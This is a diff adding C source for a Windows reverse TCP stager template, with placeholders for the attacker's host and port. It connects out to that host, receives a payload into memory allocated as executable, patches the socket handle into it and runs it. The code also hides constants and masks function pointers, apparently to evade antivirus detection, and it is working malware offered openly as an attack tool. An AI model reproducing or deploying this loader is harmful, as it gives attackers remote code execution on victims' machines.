@@ -1,0 +1,111 @@
+#pragma comment(lib, "wsock32.lib")
+
+/*! @brief Number of milliseconds to wait before connection retries. */
+#define RETRY_TIMEOUT_MS 1000
+
+%{DEFINITIONS}
+
+
+struct Params {
+  DWORD size;
+  SOCKET sock;
+};
+
+struct Params params = { 0 };
+
+void init_winsock() {
+  WSADATA wsaData = { 0 };
+  if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+  {
+    return;
+  }
+}
+
+LPVOID get_buffer(DWORD payloadSize) {
+  LPVOID payload = VirtualAlloc(NULL, payloadSize, MEM_COMMIT, (DWORD) atoi("64"));
+  return payload;
+}
+
+void execute() {
+  DWORD payloadSize = params.size;
+  SOCKET stageSocket = params.sock;
+
+  LPVOID (*func)(DWORD);
+  func = (LPVOID (*)()) &get_buffer;
+  char* payload = (char*)(LPVOID)(*func)(payloadSize);
+
+  // set EDI to our socket
+  payload[0] = (char)0xBF;
+
+  // put the socket handle into the payload buffer
+  *(DWORD*)(payload + 1) = (DWORD)stageSocket;
+
+  // keep track of the bytes that we've read so far, so we know
+  // when to stop
+  DWORD bytesRead = sizeof(char)+sizeof(DWORD);
+
+  // read the payload in from the network
+  int (*recvFunc)(SOCKET, char*, int, int);
+  recvFunc = (int (*)()) recv;
+  while (bytesRead < payloadSize) {
+    int result = (int)(*recvFunc)(stageSocket, payload + bytesRead, payloadSize - bytesRead, atoi("0"));
+    if (result == SOCKET_ERROR) return;
+    bytesRead += (DWORD)result;
+  }
+
+  ((void(*)())payload)();
+}
+
+/*!
+ * @brief Connects to a provided host/port, downloads a payload and executes it.
+ * @param host String containing the name or IP of the host to connect to.
+ * @param port Port number to connect to.
+ * @param retryAttempts The number of times to attempt to retry.
+ */
+VOID reverse_tcp_rdl(const char* host, u_short port, short retryAttempts)
+{
+  init_winsock();
+  SOCKET stageSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  struct hostent* target = gethostbyname(host);
+  char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);
+
+  struct sockaddr_in sock = { 0 };
+  sock.sin_addr.s_addr = inet_addr(targetIp);
+  sock.sin_family = AF_INET;
+  sock.sin_port = htons(port);
+
+  // try connect to the attacker at least once
+  while (connect(stageSocket, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR) {
+    // retry with a sleep if it fails, or exit the process on failure
+    if (retryAttempts-- <= 0) {
+      return;
+    }
+
+    Sleep(RETRY_TIMEOUT_MS);
+  }
+
+  // read the size of the payload from the socket
+  DWORD payloadSize;
+  if (recv(stageSocket, (char*)&payloadSize, sizeof(DWORD), atoi("0")) == SOCKET_ERROR) {
+    return;
+  }
+
+  // adjust the payload size for the magic EDI value used later;
+  payloadSize += 5;
+
+  params.size = payloadSize;
+  params.sock = stageSocket;
+
+  ((void(*)())&execute)();
+}
+
+int main(void)
+{
+  char host[256] = "%{HOST}";
+  short port = %{PORT};
+  DWORD reverse_tcp_rdl_func = &reverse_tcp_rdl ^ atoi("95");
+  VOID (*reverseTcpRdlFunc)(const char*, u_short, short);
+  reverseTcpRdlFunc = (VOID (*)()) (reverse_tcp_rdl_func ^ atoi("95"));
+  (VOID)(*reverseTcpRdlFunc)(host, port, 5);
+  return 0;
+}
